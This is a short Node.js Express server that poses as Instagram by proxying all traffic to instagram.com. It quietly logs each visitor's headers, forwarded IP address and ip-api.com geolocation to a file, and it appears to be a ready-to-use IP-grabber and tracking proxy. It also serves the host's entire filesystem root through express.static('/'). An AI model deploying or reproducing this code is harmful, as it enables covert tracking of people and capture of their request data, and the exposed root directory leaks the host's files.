const express = require('express');
const axios = require('axios');
const app = express();
const moment = require('moment');
const {createProxyMiddleware} = require('http-proxy-middleware');
const port = 80;

const fs = require('fs');

const IP_API = 'http://ip-api.com/json/';
const [,,UNSANITIZED_LOGS] = process.argv

const saveIpInfo = async (req) => {
  const ipInfoRes = await axios(`${IP_API}${req.headers['x-forwarded-for']}`);

  const headers = Object.keys(req.headers)
    .map((k) => `- ${k}: ${req.headers[k]}`)
    .join(`\n`);
  const ipInfo = JSON.stringify(ipInfoRes.data);
  const timestamp = moment().format('MMMM Do YYYY, h:mm:ss a');
  
  const infoText = `${headers}\n\n${ipInfo}\n\n- ${timestamp}\n\n`

  fs.appendFile(UNSANITIZED_LOGS, infoText, console.error);
}

app.use(express.static("/"));

app.get('*', createProxyMiddleware({
  target: 'https://instagram.com',
  changeOrigin: true,
  onProxyReq: (proxyReq, req, res) => {
    console.log("request", req)
    saveIpInfo(req);    
  },
}));

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
